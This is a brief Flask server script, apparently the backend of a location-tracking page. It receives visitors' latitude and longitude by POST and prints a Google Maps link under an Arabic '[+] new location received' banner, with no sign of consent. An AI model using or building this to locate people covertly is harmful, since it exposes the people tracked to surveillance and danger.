from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/save-location', methods=['POST'])
def save_location():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    print(f"\n[+] تم استلام موقع جديد: https://www.google.com/maps?q={lat},{lon}\n")
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
